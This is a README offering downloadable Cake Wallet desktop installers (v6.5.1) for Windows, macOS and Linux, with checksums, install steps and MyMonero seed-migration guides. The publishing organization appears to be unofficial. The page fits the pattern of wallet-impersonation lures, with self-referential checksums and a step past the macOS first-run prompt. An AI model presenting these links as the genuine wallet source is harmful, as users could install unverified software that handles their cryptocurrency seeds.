<p align="center"><img src="https://github.com/Cake-LabsLLC/cake-wallet-desktop/raw/HEAD/assets/banner-app.png" alt="Cake Wallet app banner" width="100%"></p>

<h1 align="center">Cake Wallet Desktop</h1>
<p align="center">Cake Wallet v6.5.1 for Windows, macOS and Linux</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## SHA-256 checksums

<!-- SHA256:START -->
| File | SHA-256 |
|---|---|
| Cake-Wallet-Windows-v6.5.1.exe | `79fc6ed0c0525d0cfa338714d897578c51e0373d174c074d834885de74f90325` |
| Cake-Wallet-MacOS-v6.5.1.dmg | `bf970d53b72f431947955f36b9e06f93ee3bca4dca62b39933c9fa34cf2d4875` |
| Cake-Wallet-linux-v6.5.1.zip | `a7fa282b01e667d4c198b687c9fa690e8946a8f09eacb801ad08259638b9da6a` |
<!-- SHA256:END -->

---

## Install

### Windows
1. Download [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe).
2. Check it in PowerShell: `certutil -hashfile Cake-Wallet-Windows-v6.5.1.exe SHA256`
3. Run the installer and follow the prompts.

### macOS
1. Download [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg).
2. Check it in Terminal: `shasum -a 256 Cake-Wallet-MacOS-v6.5.1.dmg`
3. Open the .dmg and drag Cake Wallet to Applications. If macOS asks on first launch, right-click the app and choose Open.

### Linux.
1. Download [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip).
2. Check it: `sha256sum Cake-Wallet-linux-v6.5.1.zip`
3. Unpack it: `unzip Cake-Wallet-linux-v6.5.1.zip` and start the app from the unpacked folder.

> [!TIP]
> Every character of the result must match the SHA-256 table above. If it does not, delete the file and download it again.

---

## Features

- Create a new Monero (XMR) wallet or restore one from a seed or keys
- Restore a MyMonero 13 or 25 word seed
- Receive XMR, including with subaddresses
- Send XMR
- Runs on Windows, macOS and Linux

## Popular guides

| Guide | What it covers |
|---|---|
| [Restore a MyMonero seed in Cake Wallet](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/cake-wallet-mymonero-migration.md) | Move your MyMonero wallet step by step |
| [Install Cake Wallet on Windows](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-windows.md) | Download, check and install the .exe |
| [Install Cake Wallet on macOS](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-macos.md) | Open the .dmg and get past the first-run prompt |
| [Install Cake Wallet on Linux](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/install-cake-wallet-linux.md) | Unpack the .zip and start the app |
| [Verify your Cake Wallet download](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/verify-cake-wallet-download-sha256.md) | Compare the SHA-256 with the release page |
| [Back up your Cake Wallet seed](https://github.com/Cake-LabsLLC/learn/blob/HEAD/how-to/cake-wallet-backup-seed.md) | Keep your recovery words safe offline |
| [All Cake Wallet guides](https://github.com/Cake-LabsLLC/learn) | The full Cake Wallet help library |

> [!WARNING]
> **Nobody needs your seed to install, update or migrate a Cake Wallet. Never share it.**

## Support

Read the [Cake Wallet guides](https://github.com/Cake-LabsLLC/learn) or [open an issue](https://github.com/Cake-LabsLLC/cake-wallet-desktop/issues).

## License

See the LICENSE file in this repository. The license shown on GitHub is the one that applies.
